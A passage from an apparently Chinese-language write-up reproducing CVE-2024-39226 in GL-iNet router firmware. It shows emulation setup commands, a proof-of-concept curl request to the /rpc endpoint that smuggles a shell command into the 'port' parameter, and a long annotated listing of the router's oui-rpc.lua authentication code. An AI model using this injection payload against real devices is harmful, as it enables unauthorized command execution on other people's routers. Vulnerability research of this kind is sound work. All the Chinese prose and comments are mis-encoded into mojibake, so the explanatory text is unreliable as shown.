è¿›å…¥è·¯ç”±å™¨ç®¡ç†é¡µé¢ï¼Œå¯å®Œæˆåˆå§‹å¯†ç è®¾ç½®å¹¶ç™»å½•è¿›å…¥ç®¡ç†é¢æ¿è¿‡ç¨‹ï¼Œæƒ³å®ç°æ›´å¤šåŠŸèƒ½çš„å¯ç”¨å°±è¦æ‘¸ç´¢æ›´å¤šé…ç½®äº†ï¼Œä¸è¿‡æˆ‘ä»¬åˆ†æå¤ç°æˆæƒç›¸å…³è¿‡ç¨‹å·²ç»å¤Ÿç”¨äº†ã€‚</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#ç¬¬ä¸€æ¬¡è¿è¡Œè¿™äº›</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">mkdir</span> /var/log</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">mkdir</span> /var/log/nginx</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">mkdir</span> /var/lib</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">mkdir</span> /var/lib/nginx</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">mkdir</span> /var/lib/nginx/body</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">mkdir</span> /var/run</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">chmod</span> +x  /etc/uci-defaults/80_nginx-oui</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>/etc/uci-defaults/80_nginx-oui</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">chmod</span> +x /etc/uci-defaults/network_gl</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>/etc/uci-defaults/network_gl</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>/etc/init.d/boot boot</pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#åé¢é‡å¯è¿è¡Œè¿™äº›å³å¯</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>/sbin/ubusd <span class=\"token operator\">&amp;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>/usr/sbin/gl-ngx-session <span class=\"token operator\">&amp;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>/usr/bin/fcgiwrap <span class=\"token parameter variable\">-c</span> <span class=\"token number\">4</span> <span class=\"token parameter variable\">-s</span> unix:/var/run/fcgiwrap.socket <span class=\"token operator\">&amp;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>/usr/sbin/nginx <span class=\"token parameter variable\">-c</span> /etc/nginx/nginx.conf <span class=\"token parameter variable\">-g</span> <span class=\"token string\">'daemon off;'</span> <span class=\"token operator\">&amp;</span></pre></td></tr></table></figure><p><img data-src=\"/img/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/6.png\" alt=\"6\"></p>\n<p>å‡ºç°æ­¤ç•Œé¢ï¼Œä»¿çœŸæˆåŠŸ</p>\n<h3 id=\"3æ¼æ´åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#3æ¼æ´åˆ†æ\">#</a> 3. æ¼æ´åˆ†æ</h3>\n<p><strong>POCï¼š</strong> <code>curl -H 'glinet: 1' 127.0.0.1/rpc -d '&#123;&quot;method&quot;:&quot;call&quot;, &quot;params&quot;:[&quot;&quot;, &quot;s2s&quot;, &quot;enable_echo_server&quot;, &#123;&quot;port&quot;: &quot;7 $(touch /root/test)&quot;&#125;]&#125;'</code></p>\n<p>æ ¹æ®çº°æ¼çš„ poc å‘ç°ï¼Œä»–è¯·æ±‚çš„è·¯ç”±æ˜¯ /rpcï¼Œç„¶ååœ¨ /etc/nginx ä¸‹çš„ nginx é…ç½®æ–‡ä»¶æ‰¾ä¸‹ rpc çš„ç›¸å…³ä¿¡æ¯ã€‚</p>\n<p><img data-src=\"/img/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/7.png\" alt=\"7\"></p>\n<p>å¯ä»¥äº†è§£åˆ°è¯·æ±‚ rpc è·¯å¾„çš„å¤„ç†æ–¹æ³•åœ¨  <code>/usr/share/gl-ngx/oui-rpc.lua</code></p>\n<figure class=\"highlight lua\"><figcaption data-lang=\"lua\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">local</span> cjson <span class=\"token operator\">=</span> require <span class=\"token string\">\"cjson\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">local</span> rpc <span class=\"token operator\">=</span> require <span class=\"token string\">\"oui.rpc\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">local</span> ubus <span class=\"token operator\">=</span> require <span class=\"token string\">\"oui.ubus\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode_empty_table_as_object</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">false</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span> ngx<span class=\"token punctuation\">.</span>req<span class=\"token punctuation\">.</span><span class=\"token function\">get_method</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"POST\"</span> <span class=\"token keyword\">then</span> <span class=\"token comment\">-- æ£€æŸ¥ HTTP è¯·æ±‚æ–¹æ³•æ˜¯å¦ä¸º POST</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">exit</span><span class=\"token punctuation\">(</span>ngx<span class=\"token punctuation\">.</span>HTTP_FORBIDDEN<span class=\"token punctuation\">)</span> <span class=\"token comment\">-- å¦‚æœä¸æ˜¯ï¼Œè¿”å› 403 Forbiddenã€‚</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>ngx<span class=\"token punctuation\">.</span>req<span class=\"token punctuation\">.</span><span class=\"token function\">read_body</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- è·å–è¯·æ±‚ä½“</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">local</span> data <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>req<span class=\"token punctuation\">.</span><span class=\"token function\">get_body_data</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- å¦‚æœæ•°æ®ç›´æ¥å­˜åœ¨äº body ä¸­ï¼Œåˆ™è·å–</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> data <span class=\"token keyword\">then</span> <span class=\"token comment\">-- å¦åˆ™ä»ä¸´æ—¶æ–‡ä»¶ä¸­è¯»å–ï¼Œè¿™å¯èƒ½å¤„ç†è¾ƒå¤§çš„è¯·æ±‚ä½“ã€‚</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">local</span> name <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>req<span class=\"token punctuation\">.</span><span class=\"token function\">get_body_file</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">local</span> f <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">:</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*a\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    f<span class=\"token punctuation\">:</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">local</span> <span class=\"token keyword\">function</span> <span class=\"token function\">rpc_method_challenge</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">local</span> res <span class=\"token operator\">=</span> ubus<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"gl-session\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"challenge\"</span><span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">local</span> code<span class=\"token punctuation\">,</span> data <span class=\"token operator\">=</span> res<span class=\"token punctuation\">.</span>code<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">.</span>data</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">if</span> code <span class=\"token operator\">~=</span> <span class=\"token number\">0</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> code<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">result_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">end</span> <span class=\"token comment\">-- è°ƒç”¨ gl-session æœåŠ¡çš„ challenge æ–¹æ³•ï¼Œç”Ÿæˆè®¤è¯æŒ‘æˆ˜ç ï¼ˆç”¨äºåç»­ç™»å½•éªŒè¯ï¼‰ã€‚</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">local</span> <span class=\"token keyword\">function</span> <span class=\"token function\">rpc_method_login</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">local</span> res <span class=\"token operator\">=</span> ubus<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"gl-session\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"login\"</span><span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">local</span> code<span class=\"token punctuation\">,</span> data <span class=\"token operator\">=</span> res<span class=\"token punctuation\">.</span>code<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">.</span>data</pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">if</span> code <span class=\"token operator\">~=</span> <span class=\"token number\">0</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> code<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span>header<span class=\"token punctuation\">[</span><span class=\"token string\">\"Set-Cookie\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Admin-Token=\"</span> <span class=\"token operator\">..</span> data<span class=\"token punctuation\">.</span>sid</pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">result_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">end</span> <span class=\"token comment\">-- è°ƒç”¨ login æ–¹æ³•éªŒè¯ç”¨æˆ·å‡­è¯ï¼ŒæˆåŠŸæ—¶è®¾ç½® Cookie Admin-Token ä¸ºä¼šè¯ IDï¼ˆsidï¼‰ã€‚</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">local</span> <span class=\"token keyword\">function</span> <span class=\"token function\">rpc_method_logout</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    ubus<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"gl-session\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"logout\"</span><span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">result_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">end</span> <span class=\"token comment\">-- ç»ˆæ­¢å½“å‰ä¼šè¯ã€‚</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">local</span> <span class=\"token keyword\">function</span> <span class=\"token function\">rpc_method_alive</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">local</span> res <span class=\"token operator\">=</span> ubus<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"gl-session\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"touch\"</span><span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">.</span>code <span class=\"token operator\">~=</span> <span class=\"token number\">0</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">.</span>code<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">result_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token keyword\">end</span> <span class=\"token comment\">-- é€šè¿‡ touch æ–¹æ³•åˆ·æ–°ä¼šè¯æœ‰æ•ˆæœŸã€‚</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">local</span> <span class=\"token keyword\">function</span> <span class=\"token function\">rpc_method_call</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token operator\">#</span>params <span class=\"token operator\">&lt;</span> <span class=\"token number\">3</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_INVALID_PARAMS<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>        ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token keyword\">local</span> sid<span class=\"token punctuation\">,</span> object<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> args <span class=\"token operator\">=</span> params<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>sid<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"string\"</span> <span class=\"token keyword\">or</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>object<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"string\"</span> <span class=\"token keyword\">or</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>method<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"string\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_INVALID_PARAMS<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>        ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token keyword\">if</span> args <span class=\"token keyword\">and</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"table\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_INVALID_PARAMS<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token keyword\">end</span> <span class=\"token comment\">-- å‚æ•°æ ¡éªŒï¼šæ£€æŸ¥ sidã€objectã€method ç±»å‹ï¼Œargs æ˜¯å¦ä¸ºè¡¨ã€‚</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span>ctx<span class=\"token punctuation\">.</span>sid <span class=\"token operator\">=</span> sid</pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">is_no_auth</span><span class=\"token punctuation\">(</span>object<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">)</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>        <span class=\"token comment\">-- rpc.is_no_auth (object, method)ï¼šè·³è¿‡è®¤è¯çš„æ–¹æ³•ï¼ˆå¦‚å…¬å…± APIï¼‰ã€‚</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">access</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rpc\"</span><span class=\"token punctuation\">,</span> object <span class=\"token operator\">..</span> <span class=\"token string\">\".\"</span> <span class=\"token operator\">..</span> method<span class=\"token punctuation\">)</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>            <span class=\"token comment\">-- rpc.access (\"rpc\", object .. \".\" .. method)ï¼šéªŒè¯è°ƒç”¨æƒé™ã€‚</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>            <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_ACCESS<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>            ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>            <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    <span class=\"token keyword\">local</span> res <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>object<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>    <span class=\"token comment\">-- è°ƒç”¨ç›®æ ‡æ–¹æ³•ï¼šé€šè¿‡ rpc.call æ‰§è¡Œå®é™…é€»è¾‘ï¼Œè¿”å›ç»“æœæˆ–é”™è¯¯ã€‚</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"number\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>        <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>        ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"table\"</span> <span class=\"token keyword\">then</span> res <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">result_response</span><span class=\"token 